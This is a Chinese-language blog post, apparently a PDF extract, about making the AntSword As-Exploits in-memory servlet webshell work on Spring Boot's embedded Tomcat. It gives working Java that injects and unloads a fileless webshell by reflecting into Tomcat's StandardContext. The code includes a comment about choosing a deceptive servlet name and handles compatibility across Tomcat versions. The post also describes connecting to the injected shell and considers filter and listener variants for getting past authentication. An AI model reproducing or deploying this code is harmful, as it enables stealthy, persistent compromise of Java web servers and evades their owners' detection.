1
As-Exploits内存⻢兼容Spring
前⾔
过程
关于反射的坑
addServletMapping的兼容性问题
运⾏截图
最后
@yzddmr6
最近在对As-Exploits的内存⻢部分做兼容Spring处理。原来只是照搬了哥斯拉的⼀些payload，现在需要
深⼊研究⼀下了。
⾸先要Spring中默认没有pageContext的依赖，所以相关的依赖部分都要去除。蚁剑的jsp很早就不依赖
pageContext了，相关⽂章以前也写过，不知道的同学可以翻⼀翻我的博客。
在研究过程中可以发现哥斯拉中的payload基本都是⽤反射实现的，这样的好处就是可以不添加任何依赖。
这也是为什么哥斯拉只有8m的原因。
去除掉所有的pageContext后，在Spring中获取servlet没有问题，但是卸载的时候报了⼀个错误
前⾔
过程
关于反射的坑
 1     public String unLoadServlet() {
 2         if (wrapperName != null && wrapperName.length() > 0 && ur
lPattern != null && urlPattern.length() > 0) {
 3             try {
 4                 Object o = getFieldValue(this.request.getServletC
ontext(), "context");
 5                 Field field = o.getClass().getDeclaredField("cont
ext");
 6                 field.setAccessible(true);
 7                 Object standardContext = getFieldValue(o, "contex
t");
2
内存⻢管理模块报了⼀个这样的错误：
 8                 Object wrapper = this.invoke(standardContext, "fi
ndChild", wrapperName);
 9                 Class containerClass = Class.forName("org.apache.
catalina.Container", false, standardContext.getClass().getClassLo
ader());
10                 if (wrapper != null) {
11                     standardContext.getClass().getDeclaredMethod(
"removeChild", containerClass).invoke(standardContext, wrapper);
12                     this.invoke(standardContext, "removeServletMa
pping", urlPattern);
13                     if (this.getMethodByClass(wrapper.getClass(), 
"setServlet", Servlet.class) == null) {
14                         this.transform(standardContext, urlPatter
n);
15                     }
16
17                     return "ok";
18                 } else {
19                     return "not find wrapper";
20                 }
21             } catch (Exception var8) {
22                 return var8.getMessage();
23             }
24         } else {
25             return "wrapperName or urlPattern is Null";
26         }
27     }
1 15e0d5bERROR:// java.lang.NoSuchMethodException: org.springframewo
rk.boot.web.embedded.tomcat.TomcatEmbeddedContext.removeChild(org.
apache.catalina.Container)adc1b2c
3
定位⼀下问题出在这⾥
意思就是在StandardContext中找不到removeChild这个⽅法。
调试⼀下发现，Spring中获取到的StandardContext示例为其⼀个⼦类，叫做
TomcatEmbeddedContext。虽然Spring中内置了Tomcat，但这个是Spring特有的。
TomcatEmbeddedContext继承了StandardContext，并且没有对removeChild进⾏改写，如果⽗类有这
个⽅法应该是可以调⽤的。
开始以为是Spring在StandardContext中删掉了此⽅法，结果翻到⽗类StandardContext，发现跟普通的
Tomcat⼀样，调⽤的org.apache.catalina.core.ContainerBase#removeChild
org.apache.catalina.core.ContainerBase#removeChild
4
后来发现先⼊为主了，问题不是出在没有这个⽅法上，⽽是出在反射的写法上。这⾥要提⼀下反射中
getMethods 跟getDeclaredMethods 的区别：
getMethods 获取所有公有⽅法（包括⽗类⽅法）
getDeclaredMethods 获取本类中的所有⽅法 (只拿本类中的)
哥斯拉中⽤的getDeclaredMethod，也就是只能获取到本类中的⽅法，⾃然反射拿不到⽗类的
removeChild。
所以解决办法要么把getDeclaredMethod换成getMethod，因为removeChild本来就是public的，要么就
直接调⽤removeChild⽅法，不采⽤反射。在这⾥我采⽤了后者。
在内存⻢模块同理，这⾥直接全部改了，不再⽤反射。
要注意的是，在添加servlet的过程中，会涉及到addServletMapping函数的兼容性问题，并且很多⽂章中
并没有仔细分析具体的版本号。这⾥贴⼀下我研究的结果：
tomcat7         只能addServletMapping
tomcat8         addServletMapping/addServletMappingDecoded都可以
tomcat9         只能addServletMappingDecoded
在这⾥要么⽤反射，两种⽅法都try⼀下。在这⾥提供⼀个更好的解决办法，使⽤
ApplicationServletRegistration这个类。ApplicationServletRegistration对wrapper做了封装，⾃动会
处理两种⽅法的兼容性。
核⼼代码如下：
addServletMapping的兼容性问题
 1  public String addServlet() throws Exception {
 2         ServletContext servletContext = this.request.getServletCo
ntext();
5
 3         ApplicationContextFacade applicationContextFacade = (Appl
icationContextFacade) servletContext;
 4         Field applicationContextField = applicationContextFacade.
getClass().getDeclaredField("context");
 5         applicationContextField.setAccessible(true);
 6
 7         ApplicationContext applicationContext = (ApplicationConte
xt) applicationContextField.get(applicationContextFacade);
 8         Field standardContextField = applicationContext.getClass(
).getDeclaredField("context");
 9         standardContextField.setAccessible(true);
10         StandardContext standardContext = (StandardContext) stand
ardContextField.get(applicationContext);
11
12         Wrapper wrapper = standardContext.createWrapper();
13 //        改为⼀个有迷惑性的名字
14         wrapper.setName(name);
15         standardContext.addChild(wrapper);
16
17         wrapper.setServletClass(this.getClass().getName());
18         wrapper.setServlet(this);
19
20         ServletRegistration.Dynamic registration = new Applicatio
nServletRegistration(wrapper, standardContext);
21         registration.addMapping(path);
22         registration.setLoadOnStartup(1);
23         if (this.getMethodByClass(wrapper.getClass(), "setServle
t", Servlet.class) == null) {
24             this.transform(standardContext, this.path);//兼容tomca
t5/6
25             this.init((ServletConfig) getFieldValue(wrapper, "fac
ade"));
26         }
27         return "Success";
28
29     }
运⾏截图
6
获取Servlet
打⼊蚁剑内存⻢
7
再次获取Servlet，发现已经有了，并且在第⼀位。
8
连接成功
卸载Servlet
卸载后再次获取Servlet列表
9
虽然我们可以通过setLoadOnStartup把servlet放在第⼀位，但是⾯对需要鉴权的shiro等⽬标打⼊⼀个
servlet内存⻢还是有不⼩的局限性。所以⽬前filter内存⻢依旧是主流。但是蚁剑是⽀持listener类型的，
listener的优先级还在filter之上。所以以后可能直接跳过filter，直接加⼊listener的payload。
最后